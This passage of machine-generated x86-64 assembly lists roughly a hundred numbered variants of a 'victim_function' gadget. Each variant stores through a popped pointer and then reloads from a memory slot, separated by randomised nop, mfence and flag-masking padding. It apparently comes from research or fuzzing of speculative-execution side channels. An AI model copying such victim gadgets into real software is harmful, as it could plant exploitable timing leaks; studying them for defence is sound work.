	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 252
.Lvictim_function_win0_var252:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 253
.Lvictim_function_win0_var253:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 254
.Lvictim_function_win0_var254:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 255
.Lvictim_function_win0_var255:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 256
.Lvictim_function_win0_var256:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 257
.Lvictim_function_win0_var257:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 258
.Lvictim_function_win0_var258:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 259
.Lvictim_function_win0_var259:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 260
.Lvictim_function_win0_var260:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 261
.Lvictim_function_win0_var261:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 262
.Lvictim_function_win0_var262:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 263
.Lvictim_function_win0_var263:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 264
.Lvictim_function_win0_var264:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 265
.Lvictim_function_win0_var265:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 266
.Lvictim_function_win0_var266:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 267
.Lvictim_function_win0_var267:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 268
.Lvictim_function_win0_var268:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 269
.Lvictim_function_win0_var269:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 270
.Lvictim_function_win0_var270:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 271
.Lvictim_function_win0_var271:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 272
.Lvictim_function_win0_var272:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 273
.Lvictim_function_win0_var273:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 274
.Lvictim_function_win0_var274:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 275
.Lvictim_function_win0_var275:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 276
.Lvictim_function_win0_var276:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 277
.Lvictim_function_win0_var277:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 278
.Lvictim_function_win0_var278:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 279
.Lvictim_function_win0_var279:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 280
.Lvictim_function_win0_var280:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 281
.Lvictim_function_win0_var281:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 282
.Lvictim_function_win0_var282:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 283
.Lvictim_function_win0_var283:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 284
.Lvictim_function_win0_var284:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 285
.Lvictim_function_win0_var285:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 286
.Lvictim_function_win0_var286:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 287
.Lvictim_function_win0_var287:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 288
.Lvictim_function_win0_var288:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 289
.Lvictim_function_win0_var289:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 290
.Lvictim_function_win0_var290:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 291
.Lvictim_function_win0_var291:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 292
.Lvictim_function_win0_var292:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 293
.Lvictim_function_win0_var293:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 294
.Lvictim_function_win0_var294:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 295
.Lvictim_function_win0_var295:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 296
.Lvictim_function_win0_var296:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 297
.Lvictim_function_win0_var297:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 298
.Lvictim_function_win0_var298:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 299
.Lvictim_function_win0_var299:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 300
.Lvictim_function_win0_var300:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 301
.Lvictim_function_win0_var301:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 302
.Lvictim_function_win0_var302:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 303
.Lvictim_function_win0_var303:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 304
.Lvictim_function_win0_var304:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 305
.Lvictim_function_win0_var305:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 306
.Lvictim_function_win0_var306:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 307
.Lvictim_function_win0_var307:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 308
.Lvictim_function_win0_var308:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 309
.Lvictim_function_win0_var309:
	popq	%rax
	nop
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 310
.Lvictim_function_win0_var310:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 311
.Lvictim_function_win0_var311:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 312
.Lvictim_function_win0_var312:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 313
.Lvictim_function_win0_var313:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 314
.Lvictim_function_win0_var314:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 315
.Lvictim_function_win0_var315:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 316
.Lvictim_function_win0_var316:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 317
.Lvictim_function_win0_var317:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 318
.Lvictim_function_win0_var318:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 319
.Lvictim_function_win0_var319:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 320
.Lvictim_function_win0_var320:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 321
.Lvictim_function_win0_var321:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 322
.Lvictim_function_win0_var322:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 323
.Lvictim_function_win0_var323:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 324
.Lvictim_function_win0_var324:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 325
.Lvictim_function_win0_var325:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 326
.Lvictim_function_win0_var326:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 327
.Lvictim_function_win0_var327:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 328
.Lvictim_function_win0_var328:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 329
.Lvictim_function_win0_var329:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 330
.Lvictim_function_win0_var330:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 331
.Lvictim_function_win0_var331:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 332
.Lvictim_function_win0_var332:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 333
.Lvictim_function_win0_var333:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 334
.Lvictim_function_win0_var334:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 335
.Lvictim_function_win0_var335:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 336
.Lvictim_function_win0_var336:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 337
.Lvictim_function_win0_var337:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 338
.Lvictim_function_win0_var338:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 339
.Lvictim_function_win0_var339:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 340
.Lvictim_function_win0_var340:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 341
.Lvictim_function_win0_var341:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 342
.Lvictim_function_win0_var342:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 343
.Lvictim_function_win0_var343:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 344
.Lvictim_function_win0_var344:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 345
.Lvictim_function_win0_var345:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 346
.Lvictim_function_win0_var346:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 347
.Lvictim_function_win0_var347:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
